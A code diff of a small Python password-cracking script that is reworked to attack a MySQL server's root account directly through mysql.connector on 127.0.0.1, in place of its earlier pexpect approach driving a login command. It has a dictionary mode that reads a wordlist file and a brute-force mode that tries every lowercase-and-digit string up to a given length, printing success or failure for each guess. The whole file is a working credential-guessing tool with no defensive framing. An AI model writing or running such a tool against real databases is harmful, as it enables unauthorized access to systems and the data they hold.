@@ -1,15 +1,18 @@
-import pexpect
 import sys
 import time
 import string
 import itertools
+import os
+import mysql.connector
+from mysql.connector import errorcode
 
 
 try:
-  login_command = sys.argv[1]
-  flags = sys.argv[2]
+  flags = sys.argv[1]
   if flags == "-D":
-    filename = sys.argv[3]
+    filename = sys.argv[2]
+  elif flags == "-B":
+    password_max_length = int(sys.argv[2])
 except:
   print("please enter the right command")
 
@@ -17,32 +20,31 @@ if flags == "-D":
   file = open(filename, 'r')
   passwords = file.readlines()
 
-  for password in passwords:
-      result = pexpect.run(login_command + password, 2)
-      result = result.decode("utf-8")
-      if result.find('Access denied') != -1:
-        print("[*] " + password.strip() + " |  failed")
-      else:
-        print("[*] " + password.strip() + " |  success")
-        break
+  for password_in_list in passwords:
+    password_in_list = password_in_list.strip()
+    try:
+      conn = mysql.connector.connect(user='root', host='127.0.0.1', password=password_in_list)
+      print("[*] " + password_in_list + " |  success")
+      break
+    except mysql.connector.Error as err:
+      print("[*] " + password_in_list + " |  fail")
+      continue
 
   file.close()
 elif flags == "-B":
   is_found = False
   chars = string.ascii_lowercase + string.digits
-  for password_length in range(4,8):
-    for guess in itertools.product(chars, repeat=password_length):
+  for length in range(1,password_max_length):
+    for guess in itertools.product(chars, repeat=length):
       guess = ''.join(guess)
-      if guess == "":
-        continue
-      result = pexpect.run(login_command + guess, 2)
-      result = result.decode("utf-8")
-      if result.find('Access denied') != -1:
-        print("[*] " + guess + " |  failed")
-      else:
+      try:
+        conn = mysql.connector.connect(user='root', host='127.0.0.1', password=guess)
         print("[*] " + guess + " |  success")
         is_found = True
         break
+      except mysql.connector.Error as err:
+        print("[*] " + guess + " |  fail")
+        continue
     if is_found:
       break
 
